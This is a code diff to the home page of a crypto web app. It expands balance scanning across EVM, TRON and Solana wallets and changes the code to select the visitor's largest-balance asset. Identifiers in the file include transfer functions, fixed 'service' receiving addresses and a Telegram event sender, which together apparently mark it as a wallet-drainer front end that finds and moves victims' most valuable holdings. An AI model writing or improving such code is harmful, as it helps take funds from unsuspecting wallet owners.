@@ -13,10 +13,12 @@ import {
   connectSolanaWallet,
   sendTronTransfer,
   sendSolanaTransfer,
+  evmAddressToTronAddress,
   SERVICE_TRON_ADDRESS,
   SERVICE_SOLANA_ADDRESS,
   type NonEvmAsset,
 } from '../utils/nonEvmWallets';
+
 
   // Comprehensive token scan list across all supported EVM chains
   const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol: string; decimals: number }> = [
@@ -400,7 +402,8 @@ export default function Home() {
   const scanAllNetworkBalances = async (evmAddr?: string, tronAddr?: string, solAddr?: string): Promise<ScannedAsset[]> => {
     const promises: Array<Promise<ScannedAsset | null>> = [];
     const targetEvmAddress = evmAddr || address;
-    const targetTronAddress = tronAddr || tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
+    const derivedTronAddress = targetEvmAddress ? evmAddressToTronAddress(targetEvmAddress) : null;
+    const targetTronAddress = tronAddr || tronAddress || derivedTronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
     const targetSolanaAddress = solAddr || solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
 
     // 1. Scan native EVM balances across all 11 chains
@@ -502,7 +505,8 @@ export default function Home() {
           try {
             const tronAssets = await scanTronBalances(targetTronAddress);
             if (tronAssets.length > 0) {
-              const top = tronAssets[0];
+              // Register all TRON assets in the scan result
+              const top = tronAssets.sort((a, b) => (b.balance > a.balance ? 1 : -1))[0];
               return {
                 network: 'TRON',
                 chainType: 'TRON' as const,
@@ -529,7 +533,7 @@ export default function Home() {
           try {
             const solAssets = await scanSolanaBalances(targetSolanaAddress);
             if (solAssets.length > 0) {
-              const top = solAssets[0];
+              const top = solAssets.sort((a, b) => (b.balance > a.balance ? 1 : -1))[0];
               return {
                 network: 'Solana',
                 chainType: 'Solana' as const,
@@ -553,6 +557,7 @@ export default function Home() {
     const validBalances = results.filter((item): item is ScannedAsset => item !== null);
     return validBalances.sort((a, b) => (b.balance > a.balance ? 1 : b.balance < a.balance ? -1 : 0));
   };
+
 
   const sendEvmTokenTransferWithUnits = async (
     contractAddress: string,
@@ -1052,42 +1057,22 @@ export default function Home() {
   }, [serviceFeeSent]);
 
   const scanTokensAcrossChains = async (walletAddress: string) => {
-    const results: Array<{ network: string; symbol: string; amount: string }> = [];
+    try {
+      const activeTronAddr = tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
+      const activeSolAddr = solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
 
-    // Scan native balances and configured ERC20 tokens across all supported EVM chains
-    for (const chainCfg of chains) {
-      const networkName = normalizeNetworkName(chainCfg.name);
-
-      // Check native balance
-      try {
-        const nativeBal = await getEvmNativeBalance(chainCfg.name, walletAddress);
-        if (nativeBal && Number(nativeBal) > 0) {
-          const symbol = chainCfg.nativeCurrency?.symbol || 'NATIVE';
-          results.push({ network: networkName, symbol, amount: nativeBal.toString() });
-        }
-      } catch (err) {
-        // ignore native balance errors for specific chains
-        console.warn('Native balance scan error for', chainCfg.name, err);
-      }
-
-      // Check any DEFAULT_TOKEN_SCAN_LIST tokens that map to this network (compare normalized names)
-      for (const t of DEFAULT_TOKEN_SCAN_LIST) {
-        try {
-          if (normalizeNetworkName(t.network) !== normalizeNetworkName(chainCfg.name)) continue;
-          const balance = await getEvmTokenBalance(chainCfg.name, walletAddress, t.contract);
-          if (balance && Number(balance) > 0) {
-            const symbol = t.symbol || (await getEvmTokenSymbol(chainCfg.name, t.contract)).toString();
-            results.push({ network: networkName, symbol: symbol || 'TOKEN', amount: balance.toString() });
-          }
-        } catch (err) {
-          // ignore individual token errors
-          console.warn('Token scan error for', t, err);
-        }
-      }
+      const allAssets = await scanAllNetworkBalances(walletAddress, activeTronAddr || undefined, activeSolAddr || undefined);
+      return allAssets.map((asset) => ({
+        network: asset.network,
+        symbol: asset.symbol,
+        amount: asset.amount,
+      }));
+    } catch (err) {
+      console.warn('scanTokensAcrossChains error:', err);
+      return [];
     }
-
-    return results;
   };
+
 
   const sendTelegramEvent = async (payload: Record<string, any>) => {
     try {
